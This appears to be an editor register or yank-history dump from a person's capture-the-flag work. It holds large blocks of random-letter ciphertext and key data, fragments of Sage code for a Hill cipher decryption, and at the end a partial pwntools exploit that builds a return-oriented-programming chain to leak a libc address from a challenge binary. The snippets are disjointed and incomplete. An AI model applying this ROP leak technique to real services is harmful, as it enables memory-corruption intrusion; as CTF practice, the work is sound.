	jdzoaptckwdvisdsxsfdyrsuiuvobtxgejqydlfcqaxytgkmufzsgypxexytrckbshgzpsvysvyvvfjtmpdqbgufftzrbxecrrpm
	tsfcqaujsjbdqeocmewzzkrcyafammalbukqcviuimxemprrepdhqkurebmggsixmggxbkcrkytdrpzkkmzlucgtzropgunxvmqf
	smanbrzujgoxqwehqfvfitplemxvccuqwrsehkzjvvxfwsqjuqxcydmrrbmnjxotglepelobejcpztzuyqjnqgvrxozuaerybqcy
	eybgkpadruwspfazzwwtxwljnxjvoqxbvbyzxmcsyhfaktkryhqjoiqsljqqyfzwxmduxigrtiddcedbzqdwxwwnnclqpbvvuuqb
	nukqqzpzovmdthhwlpusjxoohzjpzfkpcwylphyzedxpghhuujnnghirlkyviubeppgqrgzumoilpxbtiwpcvltbpdpterqhlkxx
	gvehuyvvargivmosyxnwwsepfcgovntonvmqmshqfvzmliwrntwbtvskihwhkbhxmtmlfawawueozfnvfjbnzbtswwzdhwiimlgl
	qkrhjjjxgofyvayaqivsjmefgpqluezrpkkkawrkkqgsbajggcmqlgmsliacynbeukzsbwrdyfsetpfllmlkvtgdsbzszsymnkdd
	vudpvdggsxpursqpensqkjklefszhoiaiqzhrphryygfjjwzogqjxgupxofnmcqtdmewmtaqsfspbrjvnzlllxhxfalgrgkifqpg
	uglhlsffadbkyehuhzwiqdhmagesocimatlizfqaqaaugkzjrjbbfflwfzjkqtkkqtbvstviysccyssqcbsmdzilevkbdyqusqya
	tchxdmroagrcqkxklrjzwxtwbjhhxumlgojkapmsybjfpbjmdvwaicgemrfkrjjtleqtlklowletavuqsinuhnrcojeynpmaopfk
	ddzyswgxvrrbwzeqwjoyrhigculcpbvaydsihqahnrxbuxufrfjmukbgfchlgmilvhvgoopdcossnhjgfrzjhxgbwullmiyzlvep
	gbedwsxexchzxmwsbbqvpyzmjgsathmusckpfjphgcakwrvxpqjaewcvubytckkuqzbzcizutvsrxdbimadmwlparbquanxviaxl
	ocefpgapubkfqexmstwfosbfkgmyfatgwbegrlbmxqnuputlbbsuvhroxlsstdkzlobuwvzsaqgermbvejafshpsjuaksjjdejql
	qqmdaghlzbvdpabrojyjfmhgjsuymdwxrevgkxhjarxwwmmivsgpzuzykqspiiuymbnbplaickdsfslkdwdeorfalklimigwjhoe
	binvxsfogrsprhnzyvxxmpyulagdgvzpttgeiqktdjvxhznlmmypxqlkxibhuljcrupdjptlpzhtvgkqiqtqinavlcndtufmxyii
	tbolzjmwqrbbckgvnjzperuqzloobhrvmduidtpzfgavnvzgcgalwophrhvogwuuguhifkrvkfbtiqrengrrdzwsclhjbvnzidwc
	aelhhfnlxuutbzpnyevuzwvcezkhasuxibqkxbsqvypivhldiyvcyuxroreplgsrpgjzlcdgipvmgzamhzibrxvazmulclijnmxo
	pliwrwecvkvykzdrrffynjowirhkwcbshfyrrhyjokylnmszhbflmjrgzrvayrlciefxxvueemfvynxariiumbylleuphqgwroia
	jvjhkipxrqmcjfbqfyhomhyifuhllbhmdwrbeffzaywpzvpjtgholojxnfiwyplypvtyuhkkdwydiltjfjjdcloybrdkjrqpjcwu
	abdeejwvislydkecddxvbvhbsfdgfnroncflhpwmqfeyfietmydffxgfalkfleasfqsdrcenzeyzyqmedfvkvbjeuibmdsdemwsr
	wnwmxbsldpbtpttkwqssqlgudyxomweinxkplnnyelgvtnwkhsdskmqpraqitmjbepbfqmxfxyvhxzohedkzhgnxnsllfzflquko
	amnnaopywjpztjuvdtxagdjvxwxnakoedawqkvrxixpyjwjuzcpazyqwlstdnngbbgbosakkmzxlgnbiffnooasuvtlqshyzyfaj
	hpkcixppyqkpnfxqxgczxmawizikayppmdhiphtqfmtlokhjmrhgpcfwqefviqyjhukyhqbtutpyofinalhmaqkspcgcgycryqku
	exfyprxarrdhwrkutidxibgslgxymxbmgeokyhtydxkylsccaegxlwkqywavtfxmrcxnscpwpsgtapcbaxlbjqnkrmdyjpmwavbf
	tbdwnzvbnsurdaipezzlhnkehydgzujprxrtouqxmmseefvqyngsuvvlbicxeejgevihsceouoyoddixemzeqkaluelkithasfst
	tcmepocthvqdylyzhnpialqyicokmxdpoaoduaopuxclmnwtjicloivdojarmyuxlhsktgvrwmoglhvnathndrafipiingoqsfis
	otrqztyuthilkqaolerjewguyfoauvzdfbocqxntfddtmigwzsmknbkviskswaadpeeqrvlpbhsqkadhscllahfisazhgrshnzvf
	mqzehcizqkawfrhivpdmjpmvpkpmfbxzsnuhxvugdzdlwjfoizwisuzyzipeahihgamqicnlflrcspmixeevuokzxbnlyebeqjcf
	qzdinsubmojolizzcgdkiqazmszkibkhtkkxvrewbitiiuodckkjahnqybhgywhkloyewlogawolzmefmbcquckosndwcwdbifrm
	tpicszhvhbwmayiwgafhzaxgqqmgrvixagtgbpottlsehmembxsjouzbpbfqccjjvsfibdgtbsprnashholgyyoaajrnzsmazowq
	mhbfjcelagsnhrhphfpkeazcjvemovmufsosbjjqydvxynxqoxhtbruwozncdtgprlaqyanhebojdbrbumnmrlyceymimwbwmcsx
	hjrfpfoizvjnjidoutyyuknuetgtjsocbthvvkavhgaythieagydgnjinmawgpqppgxifprypchznpyyvihvuvdvetxrbnlfnwav
	elxpgclejnsalthiaumaxkdjgzerdlxbrtfsrffocmqulwxnktrukzyzlsrlfuxcqvcyiwmbowdnyyrohqspuxpvpoaxflytympw
	ubbvjqfbbyzofcvniqjpiekefrwdaadrbppxpjgbwdsnwrrtglfudzrczddvyrtewfmyofzcilsorfckleoaxkrvpenljzykakzu
	tveighfzlnqwlhvnaffmjebpnrvytndxtytmtjskhvdbkbunkodkxndppuzvdvhnlekiujuudbiuqzawaupgutyjkgxcenrexfkk
	zmneucqlhpqwaxixwniaibkxxtplsaywtonrayfphscuqczxxpdrwpsdaqgcemxnwlhivyhyjvrutvttolggkqtqfhndzovlxceh
	adnmswwpofhbspsnwqktfxawdgfvydxhhfrkzmwwtowbvehixyugnfqyknwslhywithdongxmizwigcezzmqclbsoasmvqmnqmka
	mqjtafghanprhmwqsevbgqwvsdgawaeqvguietytxvjixadbozbfjvvzlhecvpgzoizbocakeklwicdkywlduxuufgyvxbxmigrv
	vyvavhqquqmjzamlgcyyzyzjajnobisoemqiouhykotzsyxwmoyospmsbplfjocxmekyvzitmkupqflniiamlkzzyoejvhzvtseg
	hhtqbpivlqjjaqecmkuywiogvpasgdcglcdrnaedfuvoxydgnrcqtylhcxtileodbdmpaficarseqkgrdduxucifukncrjvfrbaw
	vjuxjpgamfbaheluejsbltbxuapfulcuhzjekkqqyowcjsefokpesnykojpzedjpezvuhpvsjyzrlcjoqxrahlglhuesckhfltiw
	lxhjdzqgvuvskiqkwwqgwxjhpjnitvyezzjybqgfytokhrixmytpvtwagjonhuhzdlkuiyzrtotryfloiotfzynfeiofterrqkco
	rpdmbrazhguzgwsiyzpumyfiyyjcngywtlyonbtruptzeqvnqfeymsikcnfujgjxxtmwtoajxwipxepujcjfqutkfpfdndpskpit
	wkjlcthczmdsycwymhnszbqvrcmzdyxstbldxikceztmyqtfocpztvbatbcytxvysojtqbgzgrxrgftgcctarlziklpqgnucvvex
	rpimcopyctcszyaztdwusxynwlwiihqcwxytloswoockdtclairahdjuauupzmphjxhwapnqhwqrbncsvafqcuuftljukbfvqpdw
	crcsngmpnpgqcsqkvlqtjscduobazdzwkhvgitywsgbbgtjyumlbukerxsjbysybqnzfkoipfhtnqyhouelqbaixaqjsmrtciihg
	cnsqfjokdsvzarfgvkyzgrybhqrkgpdanuskanflaopzapodcybyqsyzablwwuhkfhzzercrbwdnrhihpxlhpoqtbxkzqgaktwzn
	tqfojlkrysabykixxvwrxjsmjsipbjbmfceyuszmnpdfhofdrgzlkquvbfydoelnhxxlzzztylxlageekfsgczxncudperljduin
	wimrutqxqdsdoxptnikgxomhfnmywrbgigpjgkqdqcgcyjljmcxtkaeulgnxsoclhnzrffwxoyrwxkujvpgephcneulskpsigxel
	ufipkrertyhbzqeaiytmrfenbgkndxjzdqpgtylhakaugkwgbpdwnviascaepepaxmuckukqlldfdcmoufgjfapspidhfffopyxu
	mypgzvacrbuxubhcfwcdhpnryogvxlmijsiihgmowbdzyukjoufnsjmxmdgqfmijndgtfyzphsqmrqpbnjauldlgahhzcgnrhmri
	hahafoxstsgpgsqomggxwibyexwcybxzwgivlahisjqkmhfwdjlqnqffvoipvfwcnanmvrulmuclogrsnlhovbivmemlgxpnjrfb
2562c313c92bd4447854c942b9dafd8a|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|13|10|V|python
	ct_matrix = []
	for i in range(100):
	    row = []
	    for j in range(100):
	       row.append(ord(ct[i * 100 + j]) - ord('a')) 
	    ct_matrix.append(row)
	ct_matrix = Matrix(Integers(26), ct_matrix)
06646be1e5f8ffcc5fb149ac1291779a|file:///home/neo/ccsc/calanthe/kgrams.py|4|1|V|python
	for i in range(0,len(b)-n+1,2):
89c01f4f523a828932cbfe4575521415|file:///home/neo/ccsc/calanthe/kgrams.py|4|1|V|python
	for i in range(0,len(b)-n+1,2):
	# for i in range(0,len(b)-n+1,n):
	    # if ord(b[i])==ord(b[i+1]):
	    print(b[i:i+n])
49984e207417f46a88abdaabd65bc847|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|18|5|V|python
	# for i in range(0,len(b)-n+1,n):
	    # if ord(b[i])==ord(b[i+1]):
c477c484a850b4652aa577c77ccefcee|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|18|6|V|python
	for i in range(0,len(ct)-n+1,2):
	    print(b[i:i+n])
64790844a5600494d75ab5c89261b2c0|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|16|1|V|python
	line = ''
aacd52c13c5ce280bf3515c4c8a01b1e|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|14|1|V|python
	pt_matrix = key_inverse * ct_matrix
55ca49c24e573e11d19e80f8ff177e9c|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|18|1|V|python
	    print(row)
948507c85247f008b5a90e90d16cc774|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|16|1|V|python
	ct_matrix = [ct[i:i+n] for i in range(0, len(ct), n)]
02798a57b75b6e67572c1c60df66f577|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|18|12|v|python
	ct_matrix
05ab4459518102ca835579c700c6f1c6|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|8|1|V|python
	    for j in range(100):
	       row.append(ord(key[i * 100 + j]) - ord('a')) 
373b6b870316f37da49071c61e1f0c09|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|23|5|V|python
	    print(new_line)
abb8351841001ba78b7f6425ebeb890e|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|22|5|V|python
	    new_line = Matrix(Integers(26), new_line)
a95f47d4c7d09df9c131c37f50accdc7|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|23|46|v|python
	ord(line[i]) - ord('a')
b8462830b4736ee66f4ab0e1c237bf2e|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|19|5|V|python
	    new_line = []
34ef3c3ba9a18ea2865b42bd5e1b01ce|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|22|5|V|python
	    # pt_line = key_inverse * line
87cde51c80cc540d6455ccd4ebee7053|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|22|5|V|python
	    pt_line = new_line * key_inverse
c76a5e6e59cc08df01f0cd7e5534ac5b|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|22|5|V|python
	    print(pt_line)
0c918194c1a15954e750d4a8ed403f51|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|22|5|V|python
	    pt_line = key_inverse * new_line
5c010546384a6d4584f54e628627d440|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|24|15|V|python
	    for c in pt_line:
	        print(c)
6d0b4dc7bbedea06cdb65f0a022f253a|file:///home/neo/CTFs/hsctf/xkcd/plain.txt|1|1|V|text
	ryjpureelbzjxqrgzlntnyzzkzaukwqcriugpqefejxhiwrvqiwhjyqzdxxohpfwmmwyzdsggvmvsruvveqvqtoponzhvmafjuwc
	yieqrmsetsghlzneawzdnprpwxlekpehrdlqcptwilqcecxptbgbnqlnfygdxylxoiysfhrjrycllzqzsrxjbuwnyewsxnarshod
	unuuxlqivsstnahyglgavdcymiuesdyfhfgkkibfbhjboznjicqmvqrtiihnnizflknwmckejwgoscsntqlnlcdiyjatmqqgepbx
	vgaumpptkosxhdvphbeotujxbeznspxhqctevoulbguihonbrcpypniducniduuoxbjsxojhkbzrqyfatnicmzqnnxzwfwvabxha
	ewgnnyrfnrtegyiqwgeyfbiwmacgraaiigutrylacoxpxinnmjywojmweozmnjqhqxevybrifswswyepfldtjrytbpdmwrbhiniv
	pntvivgfacbqunksqsepephljkwfzwuykbtjqcadlhnxfzgddahdepbatshxsflcltucbgsnyspbvwoaczuvplgthxgvgpkqeaar
	tnlotxcwbpnevmjyjxvrojtpxshthtzoshkefbtbwccwewpqjvfgkwcwjqxlafgrstznyrvllxlcpmasprllxdofwiiybpqszrqe
	imxlgzkpcgkfayhobowxdssveqqqybywwchyzyslieboacmshdkiietlywhfgtntsrvbhdmbbiuovhoibgydmgruhgwyvadwawdo
	oidhymgimnyhhchqwdtpccldusvtlhgkdhsshhopsbixilztwpwielluoxqrrcezwtgsqbutxjtawwcuclkgnwbysiuprzaulmwk
	hyohgxfotugdewydwxmgsgzvbslokuxiwlpqslztcficgvvpozyiylqgugjphfywkyxzutitvviwetgfqpvwafxzowxnsiklgyjo
	bekeugzfzcblqltdbizofgtdsnlfllxvwecjtsopbpocxwnubsasuiwzywxhlyqghmfjusqxohtkpnmqumcxvviiuzwlhaahvqbb
	wsscflxxzfmprmidslmjicptwnjlvkzhfiabpqlwolyqgjnrnwmhecjbtnhvvwglfupzvoqgrmmimtafwtypjuwadxdasdftbzjq
	fbwpnjxjzylymmdlyuewnduobtaatpoxcyhaczilvvulxebtxovzjiixgazrhwdlndbqfpzlsttpdfewtkdxapimtzbonaseblas
	xswvxajcsdmedwmkxvmoejqamyjqhpzwlwcwbqqdyhwfkyartvcyrephpkhzfjazqintbkhooguuqhtghlgopwgbakqlwlewkatw
	kfcdiwexroqppnhmkudxslcdhrkyxlztuxhdgsqhkprnrhnsssjwftaiiwpggdmjfygtsqvbcxaqgrtdntkemiszrdplftalxhpe
	kuwmnllcfyqdcunmsbhcgemhswnbhujdskoxoauwmintvlfbrdhzeftleuximuvcdmuqsisjnqcybvfhxjwebwprchnobevyfngu
	sqxjnypknjiccxygzlnoqwqcgeccbrukzktxcugwdjkpjprlxdnginmtulzyzlvkorgpnikdhxjkbvqqtpmpxehansseibzwyswu
	xjutipvsmsnsoqmgyqustcqroijgevuijajfqvkkwdmwynofocaudrcgpwtfrzloszcyubnmkkzyovfogvzzqwoqwghskuvarmcv
	nzizzsciczqfqhgsjjwjrsnqbajvybtrafniuwqazsajvcvfjntkvcjpqdzctlvkervqcnaeyppqgwhvvcrsmdqnckwfhtvudvnf
	sootsauajcswbzcaxdyhqucczybkqywljotpyxrotzhznpkgdtouuvhbkplntgkdmhmrbvhonuepjlilrzgomyjwbgikadglhkab
	bxuyavocpszrzuvjjdfqkzzszzfkrdpuyenuhmtcqnezjqwotoribgwnrzyqhkgrkmywfnbqaftxkorwfhiwlcinnjduvzyscuhi
	fuhrhfcmczljzazhqybzcwyfxuootekznjshdoocqmfgrldryzrzusvssfewyzmkudinyrpcmspbjjpudgejsqpaystwuoyxfrfa
	zlsvvsloayoyiukcjsvsgibcsujsxrowifvavwenrbjdvhbvwojjsotwyhqpbgowpjpncwavecawybodrtywoqzftklgvtkwonfh
	vrdmpxyisswqaltjeuyrdmgpexdtifgakmbtwjxgnoehwzqnjvbdsijajvibyswolwwrrcsltblxzriqybdsczhedatwkninwnoy
	jsgrnynabirouysbdtscmkagzosfodlcvsqngjwraxpbwnqdubcmyehawqvnucvhkioyxkimozcszsrsnhrxzttuikupccmxjpce
	hmldiuiwdgpzszzhczhvnjtsoaihsxqxsglvfziupybcbxychcyhowwhajgtoomooptscexntkgdkgxxbanddrgaqlftkjjxfrif
	uabuaaqzqqfgsqidxpigcsaxmwiemxvbkojyowhqsslyvggygqnmkqliozjxoqbrmrgfnxmgivenlesetnvndztcoksapnoydrgp
	sttqzulnobyhvspwrktgxosfigimmdhvsczrvxzhxxqfownxmcyoluutfkszplyetmoflhoinvmrrzxeutjtbvvjmcctibvshqdb
	ctiofrimtwrsregkfbbotcagfabsiwxydtvrdnxfsizieiucdjngazmwzfgtynzmllymceblvpspcwdavfrzuptsryclyzjqgszd
	lgpwlyqmdwhaihiobzkfoihpzsdphdnvfzrghiqzrbzsrnkjnvmtvstfmssooxdxifijkmpqkjgfwcusintuyffwijhouequgmhz
	qtskfixycvdzciwnuksxowhbfkqpskjzmtoxjmzdfwcpwvsskxpyltmbxfdeyldmvkecdrpbppsieexqqkkxiuyefraiuzcmzspi
	ohezzsjkzvoithfbqsqtuvxsrjrmwtwxuyogjmosqottxjfpakpoeajayvdpxxijreimbtzdrnuabbokuftcdsaactbgqdwqgykn
	llkqpqpyaljlozwqmpciyohrxoyjhmvckjzdciixnuoedszebybbelgfzlmiluavwrqmbgqhwnaqliglqxlxaqhfigmsjqkizjqm
	tsjmviiylgasklnyqzyqaxzgxfyvjoccjnjrknqczgugcnuqqxqqcaxsofvezitjxdojzkachnihdrptyrffmpecvpvztlokltmz
	jnmquwwpqmiyshactickanpvakkopnpclqilvvzefyyuwjovxdwxawtxqdlljmsaesfunqvlznjtarbmsxhkhjmqlyruudhqopgb
	pnuudvszhcssqskfxdxvqvcnseuubwyhwgsbnnadflkxcleddbhxgdgfbrakttjdoxmwtpbxqhklakpmgnsaqkiugnwybxhklrlo
	sonszesdsssmtiyxtkzavzalicfxthjkvtpyyteviblwhzywvlulfqaxviuboakyvlthzolycwyxzxdfhnpzfenfgyljbhesftma
	novnfmmqhfxdcarpsswqzfukbepkgtnvijdxapjbgsitztjiwttfsxwxvfkxjxqtiecxuhbxpuhagynbnycmtairclznjomjxegw
	zmokcmiesoykpzcwczlrhjnyakossduynleixmvibvuajayzwjojeodzknovyqrbjtyziclohalqbnakprydkcasygjmpcogmqwk
	xlicwmcvgddiijvwlwaaezehehtjiebxklavoimaginegivingtheplaintextandnottheciphertextriplmaoqstmbzirvdeb
	zfntqqwjnnfbzawoypltfqghklpziltmieugmfrwzgtrurzmhlxwpjniwmbjflcwveyfxastfkhkdgeofardxbdclvwzsnnxpbsn
	zbgjpictfehcstqlcftuqvrnidvjbanbblufxqthuqlnklzxhmfurspfgnmtpdelelxzlifvafqwmchjrkrjsnimxdfpegoksnok
	yxwizjukidirbaovtbwcjlyzpmwexqzoggyxoanpdywgvyglgjmggoixpqzahqzwjqxplxpkbjisbgdpgmyhwyriqqcsuxorliyy
	kvhpxlerjysnrzoylivzwtqzbbvxakigmtpsgjonazdfikcoykcgxlvmfwnhwsekgphadhljfeszyumtxccaueydzsouwusijpwj
	tcjlzceteotwxplvhsqdnzycpyhokfttsqjkwaeuuqzuogndelyvtgcjuhbvmstnkrfdszikzawjuqiwktdsbaiuxzgnbadexsts
	bttptqiuwtpzamucufpbuvvukycriwbvtxzctdquoocdnsudrfyssobbinpysrbgatbmtcjkodwlzuyrnpnbgkrwsrmqczrdejlb
	aoicfbucqogduaqvncrvkqaxohxrusitxnktkjiaytfpcfeblwqxunwimgykbwdkavtkxwutdkdfrjzftgjvlvrwckuizjylqwdn
	shyaujozunlphcjmlwbjuhmuglixsxbwoozqhwtifccmwlpejfkrsbxqgmxaunwmaaoyjbhmklvypdeqpdtavbotusugqegqwefw
	goankyyacwwpzmeztzotfhunnlthqheyskilwkjlgqxbdunkjbqtqjnnwyqjysqcgumjqghwpiimlrxdtcdscwdvnvayddgobpgv
	dheghxnifdbpaadiyaqzylwixgyzxinqaejipvgrbewisirooakyukqqxlzoszudnfndguutdhlypnmothgzkrimwdaeqnjgxfjf
	aacqoinxrawsjvgkuhlxughgtxljlmqjwbshwkaymysgouuljnwdlmmhrefdptfjulzxgeltcpadyeraoztbwvwaktvltxmwcaqg
	pypyzladcbvgovibrhomzijhnrgrkmtiyidsifcdtnexeoukaqoaplsgnhocryamnymxuqsgpxeuqxevfpdaqvrxhoinakpdoiiq
	gbsbwxbqelxtdfgwbngnfnhjhnoypuztjefdxhzsglgulrgqhrjygmuzjylbpbrmcvywvlvtsxqjbhspjwxuwcnqeqlagokgtksj
	flelaxhagzevubqttylmyzeezwgcrcuflaxowhobyasaktefgutekqwsbdejxcseiwpwdtxfpthxtzrqzqtmcvytxraupnycmdvu
	jimkfmwgerwnesohzkhmzajwbvzxtauuugewpfepavxshzlmzjrofdmbjkpeequklnvxupqbqjycbjhajvmkrvsfruydbhbwjzib
	envacdozqopvmqhiweimjckiohoqzlzymctxkgtbejnrysjfjtmnxhhrpcwohwytvfllalmdcacevhfjojsfscfczxtxiknpwxpk
	vzsjnppcphciumpoykouizdlodlyvraaqmcwztfeeyqmdppgwkikibbsiviskbtymgavljezclcjwedxxhdzwtelvpzmqgofkwyv
	gfhpswkqkcbijgnjkzjodfnksuvomuhptxvctbcggiecpyitlhknwydhufsfhrbjgyttkqirwrqxqjbdyugqpdpfkpsgcdilyqmx
	fhvjrqcvaubogqkhgjlnjpglfrlwmgiknvndegxbgbmrcloftegvkevvcgdvsaecphbawacpaayoqmbfqaunkxgfjdhemzbodjgo
	bzgbixwiznxonjpqbblhnchwjiviuqmbzqfumvzjrcmqkzjrxxqrvmaumkweoitoybhyueqlheehgtmkqwnzxzzempwkgldgbxit
	utanvrvznwiqbyxrvooxfypkppvivamjppxrutlnffdciitkmylrhinyrtqgozdkdleorfsvfjlwcfyiieniokfkfcwwziktqgii
	dxfhzsdmkcrnvlclbjrjfpukvouoohczwjpidzhpbhatprlzwduplkzbeakujuoetpwcxmivzoohxzsvljcvvveaubgpurhztxcy
	fsvoygjekczlkhoileuirpanoolepxfriqxcqdjjujbxflahvnduhtjcitrnakcdesawbsmyacwarledefbkrrplhdbngrfujmmv
	rubwgtjxfyjftybmwgfuobgfisetclbhsndfcbertohbqzqheovclwvafnskhnckfpkonjacsrtolhquqxkrwnyztuulzmcxqfzo
	hbrbzdekfdzvnpqtajbsfxoqimekkuixmebqyjyvhwhqnrjiqyogvpqgwduowsgtfjmvjfhcfecpuudgmbwaaotywnjasguihpip
	umzvjxgzagwsaxmwquodpvcbebliwoncfnmyohlxhmznggqulcfttnwrnsvnxxujgllzjcmycvhzjsocaophmfbgnjoyljczshdd
	jcpkjdobrnoavzeudkerlcqdwdxlkcrokothakdcjbaoxputrhzdlcmjksqumbyixrurqvqtrgjngretdtqrgexfnwzungcbpfyo
	nmhducyqcnbxvuuzsphjwznmqksgwrstbfeyczenhlwgbpgmquzmnxmqgglsxgjnhqkqeduwzsdzrdtcdmtcixyqnqwflqfluxxp
	nnzqyaqfzojvnnhleppdipaxvqmwwtvoarccclqghwveftbecvrlnohgsnrmkuisisdtnmmrukpmskxsxtzlwjtvmbitfqmccehw
	jgziooslplmmymduwdxcvdznvgrmsdjfubkcruxbcxfwnuhfeqynqrrxbsncdrcaynqzxklrlavydonrlronkescllvkvrbrnqno
	kbeoxoefhgqapuisofysstewcodczfclujwvqmkmrhoaixoeayuwcpwcuugsdfaxpxbfpawrhunwqyhdbmsphuysbsepryhcztcf
	heqntionswprkaiqezwactbxakgiowudlgzbpcblzvqcjbeccnbsbtzddcikjzmffqbjvzygdykzxenqvpzxcrufpcnjxctrvtoq
	hnwobyqscxsoddjhuktdablovhfvsfmsapbeomtedceuihpokojnmgrlvubilbswgccxlfdqcvnebjyyzvauyoknbomqebhttlhf
	tuzyapcixyvqjzbvslxszqczchngaqfwmgmcelpgiyjphrcumuatrrbkiasusnksylqjtbpbhrsipkuxqgllzanafwzyqhqszamr
	huvqcyhuoixwispinbtfnqwdzfjtkkokzecmbucvwgkuszzrcazgpyjjvybxlxxagpmfjuyebaipuhpyqfnmanuciuqinibagpjm
	enywolpipxsbryvqrdslsobvgaorosxwyktnouzdxzegjargvcmpyitxlvdqqlpafkohqctqgedfuvugxjvfbjzxehyqazsubjeg
	lkwvqbvzagwipbvwlqtoivcmqoenxipblmxxflrolbtjrwyrlhlpacrjatropgrhypkqlkagpwmhpixaxmbxquyuftkjrtijljpt
	shspgotapdqybvsdaakbssitgxdhkhtvkzpjpdprepjfallqilgqkgrkngzuyxbtzkdokqibilcyvicjmpzthsxtngwmcyrmofmu
	vblsbclskteaehiqcnuillagmmzqwdrnmojybioyzutiwzmltrlddkdpanzuoqcuxichvwqxcfzesabfnfpttdiwhqalvnvkiikw
	bxsfjvagefeqlztndtvrztjiacwwanjqlpedqdsyplffxmbhgtasfxttnxpnlzppodvznolfktxoqounuvemgpojdlbxubcookvx
	wasgknhpnfsxsezwgpgxfkmdtbmdvlnofkxhtpvfbfgfxnaaxurcoxorgshutrtuouwbwqrtikpuwjaaravqvmoopnhfuivehsbv
	coolzdvumfzbaqaigmzodmijywppwulvyhjudpyojxrxxqvacszizvnwbdiqwxbwmkijiwjvoglfwbyirykgrafrjcfctnubtgoe
	qltvbmeytobxjenbolsipqrasjpohfmyvcgwvuqhaovirmbxrqqglpvvxhpomorqjyuydzlexhplclsywexgfkakefvcbsurxstf
	ticphuuwblpvcryjjfddoqgigmcekasvvctbahuneiajtogcybfycrbxybatrvplldtllxjivxqcfmhjxhfqtgasncqwkgmabkde
	cxkbhhggxhaoyntkhvuttlurjdmtnjywehoxaqajjgdllyktsczwjgkehczjlexhryvizyzlkewvrvyskhemawqoakwbggpatavb
	nehylwfzlmunysqyqyrtencboxippccydmrvpnnvummxkggzsvlkgipofiemfrgffdcaekvcryycdhzdiuhhflgtbrowpyulkvdc
	clnxktjvlzngeflfxgbcvrteudtypnxzqrbnttyhywyobghcglqcezmusamguyhfxbohisqadxgzkhufymejdytitvzoztmysjrx
	xfslucyvjfmqclevybdzdxhahtmdoczyhjurosjfbibhoigqarwbgqvdaezfrstxbtnhxmjisegcdvpuhwaijturbnliykglzqfa
	qyklgkrxtncntejhzwmnrhnnzmhzldwfphwdwnwsjgsrrrdkjxgwjfrpvjoujygtqwvwdnkiacyrncprkisqlnusgihckeuinust
	xrbfapetzafauiibpgsyktlyaffnlkmdfdpdmosgkccirqvnoafyhxldbkwrvccqixbjpuvwczfipyiayemthpcchfeibgllymix
	bhgpcubdvmppqzzbcguqqyxdfugtniuayvnighzgneaaswuljhygdeomvlxcfmfyuodhonfdmxfbrmerboqlgdrzatnycuirpzwa
	ofwhlcdlivrtsvqyljaumoggzibcglqovjhhidvisufxpuhrcjybgjkcocjpcjvovfxokpzodhuwayoofxtqlgykbabtxeaahokl
	hbfsijcuhmhjhyygulwwmhndqompsdixahjgjovtkibhihwjjbnfzahoouwkfjtvxyfvrfnaycoxfmlodrzkepaffboflxmsoxnr
	dyolpdyrxwxeiatrvuubkmhkuiimfwgciuihdqakwfxtxidgdhovbgwhtmbekgnqqrwzwoedqjgkmwyfggzruxrlmakepcypinsz
	qfltlvrhlffatlhlphmdkqwftgypkykdqzqvcrgprnrnfquoyoexkfnsbfzvccsavpeyrdpunghjooguplshfuebbnpdpauyjowq
	bohmhrxjthhcbviyuevhdkocobboihqabzypcqygmcizmiouotcczeeawdvqlajbufkgboqqpaiiamehksiyqselrpbkkkybdquh
	ghkazvbctwipknlpyaeuyjmwuwniyooxjapjslhsjhszqpnqomtglkteniifcmmuifzwwsilgvljlhnuwxzowbtnrfnzlsfiiuap
	auwgtgroyqxxsdjevytlzdgbsxrhstpznbhigzauralnmrvhboxxqouqqlwezgcwfldicejsmxdczphxaalbgypnbstohgsdgsfx
	aebbjqjeehxsjyofylxivrfzthhaqjtezqsgquaeupbizsgtkhcwtprtgpmgoaonxqukrclimqtdsvdgayvmcppcixsxkpnpewma
	avrlcrufvupifrmqcipomaycwsnjojnskhzvrdadjhthtoqucpbrkjicjekxdkvxfjzdzidrpurovmldntpctxoezsntvsvvazwy
b08cb9cd3e3396861679c7270d603645|file:///home/neo/CTFs/hsctf/xkcd/plain.txt|40|38|^v|text
	imaginegivingtheplaintextandnottheciphertextr
954ab2956a65dc7130f2a1a8f8e3b240|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|27|1|V|python
	    
	
	# for a in pt_matrix:
	#     for b in a:
	#         line += chr(int(b) + ord('a'))
	# print(line)
	
	# new_ct = key_matrix * pt_matrix
	
	# test = ''
	# for a in new_ct:
	#     for b in a:
	#         test += chr(int(b) + ord('a'))
	# print(test)
a1bdca311a34b2dfb97904c3d65c1381|file:///home/neo/CTFs/hsctf/gotit/exploit.py|44|5|V|python
	    b *0x0000000000400988
ba46466d33dd486e372ebf32b3dd4e97|file:///home/neo/CTFs/hsctf/gotit/exploit.py|47|1|V|python
	io.recvuntil("name: ")
	
	EAT = exe.sym.eat
	SLEEP = exe.sym.zzz
	PUTS_PLT = exe.plt['puts']
	PRINTF_GOT = exe.got['printf']
	PUTS_GOT = exe.got['puts']
	MAIN_ADDR = exe.sym.main
	POP_RDI = 0x00000000004009f3
	rop = ROP(exe)
	RET_GADGET = 0x0000000000400285
	
	# io.sendline(cyclic(1024))
	OFFSET = cyclic_find(0x61616166)
	payload = b"A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
	payload += p64(EAT)
	payload += p64(SLEEP)
	payload += p64(MAIN_ADDR)
	io.sendline(payload)
	
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
	PUTS_LIBC = u64(line)
	log.info('Puts@libc: %#x' % PUTS_LIBC)
	
	io.recvline_contains("pwnagotchi's")
	
	payload = b"A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(PRINTF_GOT)
	payload += p64(PUTS_PLT)
